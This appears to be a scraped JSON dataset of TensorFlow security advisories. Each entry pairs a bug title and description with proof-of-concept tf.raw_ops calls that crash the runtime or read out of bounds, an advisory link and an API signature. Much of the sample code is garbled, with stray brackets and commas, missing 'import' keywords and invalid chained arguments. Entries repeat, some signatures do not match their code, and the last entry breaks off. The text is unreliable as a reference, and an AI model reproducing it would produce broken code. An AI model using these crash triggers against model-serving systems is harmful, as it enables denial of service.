    "Title": "\n        Reference binding to nullptr in map operations\n      ",
    "Bug description": "An attacker can cause undefined behavior via binding a reference to null pointer in  tf.raw_ops.Map*  and  tf.raw_ops.OrderedMap*  operations:",
    "Sample Code": "tf.raw_ops.MapPeek(\n  key=tf.constant([8],dtype=tf.int64),\n  indices=[],\n  dtypes=[tf.int32],\n  capacity=8,\n  ,\n  memory_limit=128)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qr82-2c78-4m8h",
    "API Signature": "tf.raw_ops.MapPeek(\n    key,\n    indices,\n    dtypes,\n    capacity=0,\n    memory_limit=0,\n    container='',\n    shared_name='',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB in `UpperBound` and `LowerBound`\n      ",
    "Bug description": "An attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to  tf.raw_ops.UpperBound :",
    "Sample Code": "tf.raw_ops.UpperBound(\n  sorted_input=[1,2,3],\n  values=tf.constant(value=[[0,0,0],[1,1,1],[2,2,2]],dtype=tf.int64),\n  ),\n  out_type=tf.int64)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9697-98pf-4rw7",
    "API Signature": "tf.raw_ops.UpperBound(\n    sorted_inputs,\n    values,\n    out_type=tf.dtypes.int32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB in `UpperBound` and `LowerBound`\n      ",
    "Bug description": "An attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to  tf.raw_ops.UpperBound :",
    "Sample Code": "tf.raw_ops.UpperBound(\n  sorted_input=[1,2,3],\n  values=tf.constant(value=[[0,0,0],[1,1,1],[2,2,2]],dtype=tf.int64),\n  ),\n  out_type=tf.int64)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9697-98pf-4rw7",
    "API Signature": "tf.raw_ops.LowerBound(\n    sorted_inputs,\n    values,\n    out_type=tf.dtypes.int32,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Crash in NMS ops caused by integer conversion to unsigned\n      ",
    "Bug description": "An attacker can cause denial of service in applications serving models using  tf.raw_ops.NonMaxSuppressionV5  by triggering a division by 0:",
    "Sample Code": "tf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],\n  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],\n  max_output_size_per_class=-1,\n  max_total_size=10,\n  iou_threshold=score_threshold=0.5,\n  pad_per_class=True,\n  ,\n  clip_boxes=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vmjw-c2vp-p33c",
    "API Signature": "tf.raw_ops.NonMaxSuppressionV5(\n    boxes,\n    scores,\n    max_output_size,\n    iou_threshold,\n    score_threshold,\n    soft_nms_sigma,\n    pad_to_max_output_size=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Crash in NMS ops caused by integer conversion to unsigned\n      ",
    "Bug description": "An attacker can cause denial of service in applications serving models using  tf.raw_ops.NonMaxSuppressionV5  by triggering a division by 0:",
    "Sample Code": "tf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],\n  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],\n  max_output_size_per_class=-1,\n  max_total_size=10,\n  iou_threshold=score_threshold=0.5,\n  pad_per_class=True,\n  ,\n  clip_boxes=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vmjw-c2vp-p33c",
    "API Signature": "tf.raw_ops.CombinedNonMaxSuppression(\n    boxes,\n    scores,\n    max_output_size_per_class,\n    max_total_size,\n    iou_threshold,\n    score_threshold,\n    pad_per_class=False,\n    clip_boxes=True,\n    name=None\n)\n"
  },
  {
    "Title": "\n        FPE in `tf.raw_ops.UnravelIndex`\n      ",
    "Bug description": "An attacker can cause denial of service in applications serving models using  tf.raw_ops.UnravelIndex  by triggering a division by 0:",
    "Sample Code": " tensorflow as tf\n\ntf.raw_ops.UnravelIndex(indices=-1, dims=[1,0,2])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2wmv-37vq-52g5",
    "API Signature": "tf.raw_ops.UnravelIndex(\n    indices, dims, name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to nullptr in unicode encoding\n      ",
    "Bug description": "An attacker can cause undefined behavior via binding a reference to null pointer in  tf.raw_ops.UnicodeEncode :",
    "Sample Code": "from tensorflow.python.ops import gen_string_ops\n\ngen_string_ops.unicode_encode(\n  input_values=[],\n  input_splits=[],\n  output_encoding='UTF-8',\n  errors='ignore',\n  ,\n  replacement_char='a')",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-w74j-v8xh-3w5h",
    "API Signature": null
  },
  {
    "Title": "\n        Reference binding to nullptr in `RaggedTensorToVariant`\n      ",
    "Bug description": "An attacker can cause undefined behavior via binding a reference to null pointer in  tf.raw_ops.RaggedTensorToVariant :",
    "Sample Code": "tf.raw_ops.RaggedTensorToVariant(\n  rt_nested_splits=[],\n  rt_dense_values=[1,2,3],\n  ],\n  batched_input=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-w4xf-2pqw-5mq7",
    "API Signature": "tf.raw_ops.RaggedTensorToVariant(\n    rt_nested_splits, rt_dense_values, batched_input, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in MKL requantization\n      ",
    "Bug description": "Due to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:",
    "Sample Code": "from tensorflow.python.ops import gen_math_ops\n\ngen_math_ops.requantize_per_channel(\n  input=[],\n  input_min=[-100,-100,-100,-100,-100],\n  input_max=[-100,-100,-100],\n  requested_output_min=[-100,-100,-100,-100,-100],\n  requested_output_max=[],\n  [],\n  out_type=tf.int)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp",
    "API Signature": "tf.raw_ops.RequantizationRangePerChannel(\n    input, input_min, input_max, clip_value_max, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in MKL requantization\n      ",
    "Bug description": "Due to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:",
    "Sample Code": "from tensorflow.python.ops import gen_math_ops\n\ngen_math_ops.requantize_per_channel(\n  input=[],\n  input_min=[-100,-100,-100,-100,-100],\n  input_max=[-100,-100,-100],\n  requested_output_min=[-100,-100,-100,-100,-100],\n  requested_output_max=[],\n  [],\n  out_type=tf.int)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp",
    "API Signature": "tf.raw_ops.RequantizationRangePerChannel(\n    input, input_min, input_max, clip_value_max, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in MKL requantization\n      ",
    "Bug description": "Due to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:",
    "Sample Code": "from tensorflow.python.ops import gen_math_ops\n\ngen_math_ops.requantize_per_channel(\n  input=[],\n  input_min=[-100,-100,-100,-100,-100],\n  input_max=[-100,-100,-100],\n  requested_output_min=[-100,-100,-100,-100,-100],\n  requested_output_max=[],\n  [],\n  out_type=tf.int)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp",
    "API Signature": "tf.raw_ops.RequantizationRangePerChannel(\n    input, input_min, input_max, clip_value_max, name=None\n)\n"
  },
  {
    "Title": "\n        Incomplete validation in MKL requantization\n      ",
    "Bug description": "Due to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:",
    "Sample Code": "from tensorflow.python.ops import gen_math_ops\n\ngen_math_ops.requantize_per_channel(\n  input=[],\n  input_min=[-100,-100,-100,-100,-100],\n  input_max=[-100,-100,-100],\n  requested_output_min=[-100,-100,-100,-100,-100],\n  requested_output_max=[],\n  [],\n  out_type=tf.int)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp",
    "API Signature": null
  },
  {
    "Title": "\n        Incomplete validation in MKL requantization\n      ",
    "Bug description": "Due to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:",
    "Sample Code": "from tensorflow.python.ops import gen_math_ops\n\ngen_math_ops.requantize_per_channel(\n  input=[],\n  input_min=[-100,-100,-100,-100,-100],\n  input_max=[-100,-100,-100],\n  requested_output_min=[-100,-100,-100,-100,-100],\n  requested_output_max=[],\n  [],\n  out_type=tf.int)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp",
    "API Signature": null
  },
  {
    "Title": "\n        Incomplete validation in MKL requantization\n      ",
    "Bug description": "Due to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:",
    "Sample Code": "from tensorflow.python.ops import gen_math_ops\n\ngen_math_ops.requantize_per_channel(\n  input=[],\n  input_min=[-100,-100,-100,-100,-100],\n  input_max=[-100,-100,-100],\n  requested_output_min=[-100,-100,-100,-100,-100],\n  requested_output_max=[],\n  [],\n  out_type=tf.int)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp",
    "API Signature": null
  },
  {
    "Title": "\n        Incomplete validation in MKL requantization\n      ",
    "Bug description": "Due to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:",
    "Sample Code": "from tensorflow.python.ops import gen_math_ops\n\ngen_math_ops.requantize_per_channel(\n  input=[],\n  input_min=[-100,-100,-100,-100,-100],\n  input_max=[-100,-100,-100],\n  requested_output_min=[-100,-100,-100,-100,-100],\n  requested_output_max=[],\n  [],\n  out_type=tf.int)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp",
    "API Signature": null
  },
  {
    "Title": "\n        Incomplete validation in `QuantizeV2`\n      ",
    "Bug description": "Due to incomplete validation in  tf.raw_ops.QuantizeV2 , an attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:",
    "Sample Code": "tf.raw_ops.QuantizeV2(\n  input=[1,2,3],\n  min_range=[1,2],\n  max_range=[],\n  T=tf.qint32,\n  mode='SCALED',\n  round_mode='HALF_AWAY_FROM_ZERO',\n  narrow_range=False,\n  axis=1,\n  ,\n  ensure_minimum_range=3)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g25h-jr74-qp5j",
    "API Signature": "tf.raw_ops.QuantizeV2(\n    input,\n    min_range,\n    max_range,\n    T,\n    mode='MIN_COMBINED',\n    round_mode='HALF_AWAY_FROM_ZERO',\n    narrow_range=False,\n    axis=-1,\n    ensure_minimum_range=0.01,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB in boosted trees\n      ",
    "Bug description": "An attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to  BoostedTreesSparseCalculateBestFeatureSplit :",
    "Sample Code": "tf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit(\n  node_id_range=[0,10],\n  stats_summary_indices=[[1, 2, 3, 0x1000000]],\n  stats_summary_values=[1.0],\n  stats_summary_shape=[1,1,1,1],\n  l1=l2=[1.0],\n  tree_complexity=[0.5],\n  min_node_weight=[1.0],\n  logits_dimension=3,\n  ,\n  split_type='inequality')                                                                                                                                                                                                                                                                ",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r4c4-5fpq-56wg",
    "API Signature": "tf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit(\n    node_id_range,\n    stats_summary_indices,\n    stats_summary_values,\n    stats_summary_shape,\n    l1,\n    l2,\n    tree_complexity,\n    min_node_weight,\n    logits_dimension,\n    split_type='inequality',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Crash caused by integer conversion to unsigned\n      ",
    "Bug description": "An attacker can cause a denial of service in  boosted_trees_create_quantile_stream_resource  by using negative arguments:",
    "Sample Code": "from tensorflow.python.ops import gen_boosted_trees_ops\nimport numpy as np\n\nv= tf.Variable([0.0, 0.0, 0.0, 0.0, 0.0])\ngen_boosted_trees_ops.boosted_trees_create_quantile_stream_resource(\n  quantile_stream_resource_handle = v.handle,\n  epsilon = [74.82224],\n  num_streams = [-49], \n  ], \n  max_elements = np.int32(586))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gf88-j2mg-cc82",
    "API Signature": null
  },
  {
    "Title": "\n        Division by 0 in inplace operations\n      ",
    "Bug description": "An attacker can cause a floating point exception by calling inplace operations with crafted arguments that would result in a division by 0:",
    "Sample Code": " tensorflow as tf\n\ntf.raw_ops.InplaceSub(x=[],i=[-99,-1,-1],v=[1,1,1])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cm5x-837x-jf3c",
    "API Signature": "tf.raw_ops.InplaceSub(\n    x, i, v, name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to nullptr and heap OOB in binary cwise ops\n      ",
    "Bug description": "An attacker can cause undefined behavior via binding a reference to null pointer in all binary cwise operations that don't require broadcasting (e.g., gradients of binary cwise operations):",
    "Sample Code": " tensorflow as tf\n\ntf.raw_ops.SqrtGrad(y=[4, 16],dy=[])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q3g3-h9r4-prrc",
    "API Signature": "tf.raw_ops.SqrtGrad(\n    y, dy, name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to nullptr in `MatrixSetDiagV*` ops\n      ",
    "Bug description": "An attacker can cause undefined behavior via binding a reference to null pointer in all operations of type  tf.raw_ops.MatrixSetDiagV* :",
    "Sample Code": "tf.raw_ops.MatrixSetDiagV3(\n  input=[1,2,3],\n  diagonal=[1,1],\n  k=[],\n  [],\n  align='RIGHT_LEFT')",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6p5r-g9mq-ggh2",
    "API Signature": "tf.raw_ops.MatrixSetDiagV3(\n    input, diagonal, k, align='RIGHT_LEFT', name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to nullptr in `MatrixDiagV*` ops\n      ",
    "Bug description": "An attacker can cause undefined behavior via binding a reference to null pointer in all operations of type  tf.raw_ops.MatrixDiagV* :",
    "Sample Code": "tf.raw_ops.MatrixDiagV3(\n  diagonal=[1,0],\n  k=[],\n  num_rows=[1,2,3],\n  num_cols=[4,5],\n  padding_value=[],\n  [],\n  align='RIGHT_RIGHT')",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5xwc-mrhx-5g3m",
    "API Signature": "tf.raw_ops.MatrixDiagV3(\n    diagonal,\n    k,\n    num_rows,\n    num_cols,\n    padding_value,\n    align='RIGHT_LEFT',\n    name=None\n)\n"
  },
  {
    "Title": "\n        Reference binding to nullptr in `RaggedTensorToSparse`\n      ",
    "Bug description": "An attacker can cause undefined behavior via binding a reference to null pointer in  tf.raw_ops.RaggedTensorToSparse :",
    "Sample Code": "tf.raw_ops.RaggedTensorToSparse(\n  rt_nested_splits=[[0, 38, 0]],\n  ]],\n  rt_dense_values=[])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4xfp-4pfp-89wg",
    "API Signature": "tf.raw_ops.RaggedTensorToSparse(\n    rt_nested_splits, rt_dense_values, name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB in `ResourceScatterUpdate`\n      ",
    "Bug description": "An attacker can trigger a read from outside of bounds of heap allocated data by sending invalid arguments to  tf.raw_ops.ResourceScatterUpdate :",
    "Sample Code": "v = tf.Variable([b'vvv'])\ntf.raw_ops.ResourceScatterUpdate(\n  resource=v.handle,\n  indices=[0],\n  ],\n  updates=['1', '2', '3', '4', '5'])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7fvx-3jfc-2cpc",
    "API Signature": "tf.raw_ops.ResourceScatterUpdate(\n    resource, indices, updates, name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB and CHECK fail in `ResourceGather`\n      ",
    "Bug description": "An attacker can trigger a crash via a  CHECK -fail in debug builds of TensorFlow using  tf.raw_ops.ResourceGather  or a read from outside the bounds of heap allocated data in the same API in a release build:",
    "Sample Code": "tensor = tf.constant(value=[[1,2],[3,4],[5,6]],shape=(3,2),dtype=tf.uint32)\nv = tf.Variable(tensor)\ntf.raw_ops.ResourceGather(\n  resource=v.handle,\n  indices=[0],\n  dtype=tf.uint32,\n  batch_dims=10,\n  ,\n  validate_indices=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2r8p-fg3c-wcj4",
    "API Signature": "tf.raw_ops.ResourceGather(\n    resource, indices, dtype, batch_dims=0, validate_indices=True, name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `ResourceGather`\n      ",
    "Bug description": "An attacker can trigger a crash via a floating point exception in  tf.raw_ops.ResourceGather :",
    "Sample Code": "tensor = tf.constant(value=[[]],shape=(0,1),dtype=tf.uint32)\nv = tf.Variable(tensor)\ntf.raw_ops.ResourceGather(\n  resource=v.handle,\n  indices=[0],\n  dtype=tf.uint32,\n  batch_dims=1,\n  ,\n  validate_indices=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qjj8-32p7-h289",
    "API Signature": "tf.raw_ops.ResourceGather(\n    resource, indices, dtype, batch_dims=0, validate_indices=True, name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `FractionalAvgPoolGrad`\n      ",
    "Bug description": "The implementation for  tf.raw_ops.FractionalAvgPoolGrad  can be tricked into accessing data outside of bounds of heap allocated buffers:",
    "Sample Code": "tf.raw_ops.FractionalAvgPoolGrad(\n  orig_input_tensor_shape=[0,1,2,3],\n  out_backprop = np.array([[[[541],[541]],[[541],[541]]]]),\n  row_pooling_sequence=[0, 0, 0, 0, 0],\n  col_pooling_sequence=[-2, 0, 0, 2, 0],\n  ],\n  overlapping=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hpv4-7p9c-mvfr",
    "API Signature": "tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape,\n    out_backprop,\n    row_pooling_sequence,\n    col_pooling_sequence,\n    overlapping=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `FractionalAvgPoolGrad`\n      ",
    "Bug description": "The implementation for  tf.raw_ops.FractionalAvgPoolGrad  can be tricked into accessing data outside of bounds of heap allocated buffers:",
    "Sample Code": "tf.raw_ops.FractionalAvgPoolGrad(\n  orig_input_tensor_shape=[0,1,2,3],\n  out_backprop = np.array([[[[541],[541]],[[541],[541]]]]),\n  row_pooling_sequence=[0, 0, 0, 0, 0],\n  col_pooling_sequence=[-2, 0, 0, 2, 0],\n  ],\n  overlapping=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hpv4-7p9c-mvfr",
    "API Signature": "tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape,\n    out_backprop,\n    row_pooling_sequence,\n    col_pooling_sequence,\n    overlapping=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow in `FractionalAvgPoolGrad`\n      ",
    "Bug description": "The implementation for  tf.raw_ops.FractionalAvgPoolGrad  can be tricked into accessing data outside of bounds of heap allocated buffers:",
    "Sample Code": "tf.raw_ops.FractionalAvgPoolGrad(\n  orig_input_tensor_shape=[0,1,2,3],\n  out_backprop = np.array([[[[541],[541]],[[541],[541]]]]),\n  row_pooling_sequence=[0, 0, 0, 0, 0],\n  col_pooling_sequence=[-2, 0, 0, 2, 0],\n  ],\n  overlapping=True)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hpv4-7p9c-mvfr",
    "API Signature": "tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape,\n    out_backprop,\n    row_pooling_sequence,\n    col_pooling_sequence,\n    overlapping=False,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault and heap buffer overflow in `{Experimental,}DatasetToTFRecord`\n      ",
    "Bug description": "The implementation for  tf.raw_ops.ExperimentalDatasetToTFRecord  and  tf.raw_ops.DatasetToTFRecord  can trigger heap buffer overflow and segmentation fault:",
    "Sample Code": "dataset = tf.data.Dataset.range(3)\ndataset = tf.data.experimental.to_variant(dataset)\ntf.raw_ops.ExperimentalDatasetToTFRecord(\n  input_dataset=dataset,\n  filename='/tmp/output',\n  ,\n  compression_type='')",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f8h4-7rgh-q2gm",
    "API Signature": "tf.raw_ops.ExperimentalDatasetToTFRecord(\n    input_dataset, filename, compression_type, name=None\n)\n"
  },
  {
    "Title": "\n        Null pointer dereference in `UncompressElement`\n      ",
    "Bug description": "The code for  tf.raw_ops.UncompressElement  can be made to trigger a null pointer dereference:",
    "Sample Code": "data = tf.data.Dataset.from_tensors([0.0])\ntf.raw_ops.UncompressElement(\n  compressed=tf.data.experimental.to_variant(data),\n  output_types=[tf.int64],\n  ],\n  output_shapes=[2])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6gv8-p3vj-pxvr",
    "API Signature": "tf.raw_ops.UncompressElement(\n    compressed, output_types, output_shapes, name=None\n)\n"
  },
  {
    "Title": "\n        Null pointer dereference in `SparseTensorSliceDataset`\n      ",
    "Bug description": "When a user does not supply arguments that determine a valid sparse tensor,  tf.raw_ops.SparseTensorSliceDataset  implementation can be made to dereference a null pointer:",
    "Sample Code": "tf.raw_ops.SparseTensorSliceDataset(\n  indices=[[],[],[]],\n  values=[1,2,3],\n  ],\n  dense_shape=[3,3])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c5x2-p679-95wc",
    "API Signature": "tf.raw_ops.SparseTensorSliceDataset(\n    indices, values, dense_shape, name=None\n)\n"
  },
  {
    "Title": "\n        Bad alloc in `StringNGrams` caused by integer conversion\n      ",
    "Bug description": "The implementation of  tf.raw_ops.StringNGrams  is vulnerable to an integer overflow issue caused by converting a signed integer value to an unsigned one and then allocating memory based on this value.",
    "Sample Code": "tf.raw_ops.StringNGrams(\n  data=['',''],\n  data_splits=[0,2],\n  separator=' '*100,\n  ngram_widths=[-80,0,0,-60],\n  left_pad=' ',\n  right_pad=' ',\n  pad_width=100,\n  ,\n  preserve_short_sequences=False)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h6jh-7gv5-28vg",
    "API Signature": "tf.raw_ops.StringNGrams(\n    data,\n    data_splits,\n    separator,\n    ngram_widths,\n    left_pad,\n    right_pad,\n    pad_width,\n    preserve_short_sequences,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Integer overflow due to conversion to unsigned\n      ",
    "Bug description": "The implementation of  tf.raw_ops.QuantizeAndDequantizeV4Grad  is vulnerable to an integer overflow issue caused by converting a signed integer value to an unsigned one and then allocating memory based on this value.",
    "Sample Code": "tf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=[1.0,2.0],\n  input=[1.0,1.0],\n  input_min=[0.0],\n  input_max=[10.0],\n  ],\n  axis=-100)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9w2p-5mgw-p94c",
    "API Signature": "tf.raw_ops.QuantizeAndDequantizeV4Grad(\n    gradients, input, input_min, input_max, axis=-1, name=None\n)\n"
  },
  {
    "Title": "\n        Null pointer dereference in `MatrixDiagPartOp`\n      ",
    "Bug description": "If a user does not provide a valid padding value to  tf.raw_ops.MatrixDiagPartOp , then the code triggers a null pointer dereference (if input is empty) or produces invalid behavior, ignoring all values after the first:",
    "Sample Code": "tf.raw_ops.MatrixDiagPartV2(\n  input=tf.ones(2,dtype=tf.int32),\n  k=tf.ones(2,dtype=tf.int32),\n  ),\n  padding_value=[])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fcwc-p4fc-c5cc",
    "API Signature": "tf.raw_ops.MatrixDiagPartV2(\n    input, k, padding_value, name=None\n)\n"
  },
  {
    "Title": "\n        `std::abort` raised from `TensorListReserve`\n      ",
    "Bug description": "Providing a negative element to  num_elements  list argument of   tf.raw_ops.TensorListReserve  causes the runtime to abort the process due to reallocating a  std::vector  to have a negative number of elements:",
    "Sample Code": "tf.raw_ops.TensorListReserve(\n  element_shape = tf.constant([1]),\n  num_elements=tf.constant([-1]),\n  ]),\n  element_dtype = tf.int32)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-27j5-4p9v-pp67",
    "API Signature": "tf.raw_ops.TensorListReserve(\n    element_shape, num_elements, element_dtype, name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB in `RaggedGather`\n      ",
    "Bug description": "If the arguments to  tf.raw_ops.RaggedGather  don't determine a valid ragged tensor code can trigger a read from outside of bounds of heap allocated buffers.",
    "Sample Code": "tf.raw_ops.RaggedGather(\n  params_nested_splits = [0,0,0],\n  params_dense_values = [1,1],\n  indices = [0,0,9,0,0],\n  ],\n  OUTPUT_RAGGED_RANK=0)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9c8h-vvrj-w2p8",
    "API Signature": "tf.raw_ops.RaggedGather(\n    params_nested_splits,\n    params_dense_values,\n    indices,\n    OUTPUT_RAGGED_RANK,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap OOB in `RaggedGather`\n      ",
    "Bug description": "If the arguments to  tf.raw_ops.RaggedGather  don't determine a valid ragged tensor code can trigger a read from outside of bounds of heap allocated buffers.",
    "Sample Code": "tf.raw_ops.RaggedGather(\n  params_nested_splits = [0,0,0],\n  params_dense_values = [1,1],\n  indices = [0,0,9,0,0],\n  ],\n  OUTPUT_RAGGED_RANK=0)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9c8h-vvrj-w2p8",
    "API Signature": "tf.raw_ops.RaggedGather(\n    params_nested_splits,\n    params_dense_values,\n    indices,\n    OUTPUT_RAGGED_RANK,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Division by 0 in `ResourceScatterDiv`\n      ",
    "Bug description": "The implementation of  tf.raw_ops.ResourceScatterDiv  is vulnerable to a division by 0 error:",
    "Sample Code": "v= tf.Variable([1,2,3])\ntf.raw_ops.ResourceScatterDiv(\n  resource=v.handle,\n  indices=[1],\n  ],\n  updates=[0])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-ch4f-829c-v5pw",
    "API Signature": "tf.raw_ops.ResourceScatterDiv(\n    resource, indices, updates, name=None\n)\n"
  },
  {
    "Title": "\n        Integer division by 0 in sparse reshaping\n      ",
    "Bug description": "The implementation of  tf.raw_ops.SparseReshape  can be made to trigger an integral division by 0 exception:",
    "Sample Code": "tf.raw_ops.SparseReshape(\n  input_indices = np.ones((1,3)),\n  input_shape = np.array([1,1,0]),\n  ]),\n  new_shape = np.array([1,0]))",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-95xm-g58g-3p88",
    "API Signature": "tf.raw_ops.SparseReshape(\n    input_indices, input_shape, new_shape, name=None\n)\n"
  },
  {
    "Title": "\n        Null pointer dereference and heap OOB read in operations restoring tensors\n      ",
    "Bug description": "When restoring tensors via raw APIs, if the tensor name is not provided, TensorFlow can be tricked into dereferencing a null pointer:",
    "Sample Code": "tf.raw_ops.Restore(\n  file_pattern=['/tmp'],\n  tensor_name=['x'], \n  default_value=21,\n  dt=tf.int,\n  ,\n  preferred_shard=42)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gh6x-4whr-2qv4",
    "API Signature": "tf.raw_ops.Restore(\n    file_pattern, tensor_name, dt, preferred_shard=-1, name=None\n)\n"
  },
  {
    "Title": "\n        Null pointer dereference and heap OOB read in operations restoring tensors\n      ",
    "Bug description": "When restoring tensors via raw APIs, if the tensor name is not provided, TensorFlow can be tricked into dereferencing a null pointer:",
    "Sample Code": "tf.raw_ops.Restore(\n  file_pattern=['/tmp'],\n  tensor_name=['x'], \n  default_value=21,\n  dt=tf.int,\n  ,\n  preferred_shard=42)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gh6x-4whr-2qv4",
    "API Signature": "tf.raw_ops.RestoreSlice(\n    file_pattern,\n    tensor_name,\n    shape_and_slice,\n    dt,\n    preferred_shard=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Null pointer dereference in `RaggedTensorToTensor`\n      ",
    "Bug description": "Sending invalid argument for  row_partition_types  of  tf.raw_ops.RaggedTensorToTensor  API results in a null pointer dereference and undefined behavior:",
    "Sample Code": "tf.raw_ops.RaggedTensorToTensor(\n  shape=1,\n  values=10,\n  default_value=21,\n  row_partition_tensors=tf.constant([0,0,0,0]),\n  ]),\n  row_partition_types=[])",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hwr7-8gxx-fj5p",
